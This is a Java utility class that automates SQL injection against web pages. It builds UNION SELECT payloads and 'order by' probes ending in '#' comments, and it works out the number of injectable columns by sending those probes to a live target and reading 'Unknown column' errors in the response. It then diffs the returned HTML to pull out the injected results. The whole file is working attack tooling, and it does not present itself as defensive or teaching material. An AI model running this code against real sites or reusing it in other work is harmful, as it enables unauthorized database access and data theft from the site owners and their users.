package com.dhee.mine.Utils.injection;

import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.util.*;
import java.util.regex.Pattern;

import static com.dhee.mine.Utils.enty.document.WebDocumentFetcher.fetchDocument;

public class SQLInjectionUtil {


    public static String createMarkerPayload(int possibleColumns, String flag, Boolean withDashes) {
        StringBuilder payloadBuilder = new StringBuilder();
        if (withDashes) {
            payloadBuilder.append("-").append(flag).append(" union select '---'");
            for (int i = possibleColumns - 1; i > 0; i--) {
                payloadBuilder.append(",").append("'---'");
            }
        } else {
            payloadBuilder.append("-").append(flag).append(" union select ").append("'").append(possibleColumns).append("'");
            for (int i = possibleColumns - 1; i > 0; i--) {
                payloadBuilder.append(",").append("'").append(i).append("'");
            }
        }
        return payloadBuilder.append(" #").toString();
    }

    public static Map<String, Set<String>> getPageTagContentMap(Document doc) {
        Map<String, Set<String>> tagContentMap = new HashMap<>();
        Elements allElements = doc.getAllElements();
        for (Element element : allElements) {
            String tag = element.tagName();
            String content = element.text();
            if (!(tag.equals("div") || tag.equals("#root") || tag.equals("html") || tag.equals("body"))) {
                tagContentMap.computeIfAbsent(tag, k -> new HashSet<>()).add(content);
            }
        }
        return tagContentMap;
    }

    public static int getInjectionColumnNum(Map<String, String> paramMap, String flag) {
        int columns = 1;
        boolean isUnknownColumn = true;
        do {
            Document document = fetchDocument(paramMap, flag + " order by " + columns + " #");
            if ((document.text().contains("Unknown column"))) {
                int left = columns / 2;
                int right = columns;
                while (left < right) {
                    int mid = (left + right) / 2;
                    Document document1 = fetchDocument(paramMap, flag + " order by " + mid + " #");
                    if (document1.text().contains("Unknown column")) {
                        right = mid;
                    } else {
                        left = mid + 1;
                    }
                }
                columns = right - 1;
                isUnknownColumn = false;
            } else {
                columns *= 2;
            }
        } while (isUnknownColumn);
        return columns;
    }

    public static List<String> comparePages(Map<String, Set<String>> tagContentMap1, Map<String, Set<String>> tagContentMap2) {
        Set<String> allTags = new HashSet<>(tagContentMap1.keySet());
        allTags.addAll(tagContentMap2.keySet());

        List<String> differentTagsList = new ArrayList<>();

        for (String tag : allTags) {
            Set<String> contentSet1 = tagContentMap1.getOrDefault(tag, new HashSet<>());
            Set<String> contentSet2 = tagContentMap2.getOrDefault(tag, new HashSet<>());
            if (!contentSet1.equals(contentSet2)) {
                differentTagsList.add(tag);
            }
        }
        return differentTagsList;
    }

    public static List<String> extractStrings(Set<String> contentSet, String payloadString) {
        List<String> extractedStrings = new ArrayList<>();
        for (String content : contentSet) {
            String[] strings = content.split(Pattern.quote(payloadString));
            extractedStrings.addAll(Arrays.asList(strings));
        }
        return extractedStrings;
    }
}
